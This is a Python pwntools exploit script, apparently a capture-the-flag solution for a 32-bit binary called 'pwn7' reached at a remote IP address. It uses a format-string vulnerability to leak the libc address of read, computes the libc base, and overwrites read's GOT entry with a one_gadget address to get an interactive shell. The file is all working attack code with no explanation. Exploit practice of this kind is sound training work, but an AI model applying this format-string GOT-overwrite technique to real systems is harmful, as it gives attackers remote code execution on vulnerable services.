#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from LibcSearcher import *
context(os='linux', arch='i386', log_level='debug')
#p = process('./pwn7')
p = remote('114.67.246.176', 18662)
e = ELF("/home/axiom/Desktop/pwn7")
libc = ELF("/lib/libc.so.6")
read_got_addr = e.got["read"]

payload = p32(read_got_addr) + b"%6$s"
#print 'payload: '+ payload
p.recvuntil("Do you know repeater?\n")
p.send(payload)

read_addr = u32(p.recv(8)[-4:])
print(hex(read_addr))
libc_base = read_addr - libc.symbols["read"]
og = [0x3a81c, 0x3a81e, 0x3a822, 0x3a829, 0x5f075, 0x5f076]
one_gadget = libc_base + og[5]
payload = fmtstr_payload(6, {read_got_addr: one_gadget}, write_size="byte")
p.send(payload)
p.interactive()
